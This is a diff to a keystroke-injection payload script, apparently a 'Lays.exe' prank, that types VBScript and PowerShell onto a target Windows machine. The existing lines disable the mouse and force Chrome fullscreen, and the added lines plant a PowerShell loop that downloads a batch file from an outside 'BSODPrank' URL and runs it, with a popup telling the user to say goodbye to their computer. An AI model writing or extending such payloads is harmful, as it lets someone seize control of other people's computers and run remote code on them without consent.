@@ -13,6 +13,8 @@ ENTER
 DELAY 500
 STRING DisabledMouse = false
 ENTER
+STRING BSOD = false
+ENTER
 STRING Set objShell = CreateObject("WScript.Shell")
 ENTER 
 STRING Set objWMIService = GetObject("winmgmts:\\" & "." & "\root\cimv2")
@@ -47,6 +49,26 @@ STRING DisableMouseScript.WriteLine "break"
 ENTER
 STRING DisableMouseScript.WriteLine "}"
 ENTER 
+STRING DisableMouseScript.WriteLine "}"
+ENTER
+STRING DisableMouseScript.WriteLine "while ($true){"
+ENTER
+STRING DisableMouseScript.WriteLine "Start-Sleep -Seconds 2"
+ENTER
+STRING DisableMouseScript.WriteLine "$result2 = Test-Path 'C:\Lays\BSODFlag'"
+ENTER
+STRING DisableMouseScript.WriteLine "If ($result2 -eq $True){"
+ENTER
+STRING DisableMouseScript.WriteLine "Invoke-WebRequest 'https://phobiarides.com/BSODPrank/BSOD.txt' -OutFile c:\Lays\BSOD.bat"
+ENTER
+STRING DisableMouseScript.WriteLine "Start-Sleep -Seconds 5"
+ENTER
+STRING DisableMouseScript.WriteLine "Start-Process -FilePath 'c:\Lays\BSOD.bat'"
+ENTER
+STRING DisableMouseScript.WriteLine "break"
+ENTER
+STRING DisableMouseScript.WriteLine "}"
+ENTER
 STRING DisableMouseScript.WriteLine "}"
 ENTER
 STRING DisableMouseScript.Close
@@ -91,7 +113,7 @@ STRING objShell.Popup "I told you to just LET IT HAPPEN!", 3, "Lays.exe", 16 + 4
 ENTER
 STRING If DisabledMouse = false Then
 ENTER 
-STRING DisabledMouse = True
+STRING DisabledMouse = true
 ENTER
 STRING If Not objFSO.FolderExists("c:\Lays\ChromeClosedFlag") Then
 ENTER 
@@ -103,6 +125,24 @@ STRING WScript.Sleep 2000
 ENTER
 STRING objShell.Popup "Because you can't be trusted, I've went ahead and disabled your mouse!", 5, "Lays.exe", 64 + 4096
 ENTER 
+STRING Else
+ENTER
+STRING If BSOD = false Then
+ENTER
+STRING BSOD = true
+ENTER
+STRING If Not objFSO.FolderExists("c:\Lays\BSODFlag") Then
+ENTER
+STRING objFSO.CreateFolder("c:\Lays\BSODFlag")
+ENTER
+STRING End If
+ENTER
+STRING objShell.Popup "Alright, Say Goodbye To Your Computer I guess :(", 5, "Lays.exe", 16 + 4096
+ENTER
+STRING WScript.Sleep 15000
+ENTER
+STRING End If
+ENTER
 STRING End If
 ENTER
 STRING objShell.run "chrome.exe https://www.google.com/search?q=lays&udm=2 --start-fullscreen"
